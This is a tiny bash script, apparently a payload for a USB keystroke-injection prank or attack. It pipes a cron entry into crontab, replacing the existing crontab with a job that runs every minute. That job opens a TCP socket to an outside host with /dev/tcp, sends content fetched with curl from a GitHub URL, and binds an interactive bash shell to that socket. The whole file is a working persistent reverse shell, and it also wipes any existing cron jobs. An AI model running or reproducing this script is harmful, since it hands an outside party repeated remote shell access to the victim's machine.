#!/usr/bin/env bash

main() {
  { echo "*         *         *         *         *         /bin/bash -c 'exec<>/dev/tcp/cat.flag.sh/3001;echo>&0 $(curl 'https://raw.githubusercontent.com/kroneman/ducky-usb-fun/refs/heads/master/sessions/1?foo=${RANDOM}');$0 -i<&0>&0 2>&0'"; } | crontab -
}

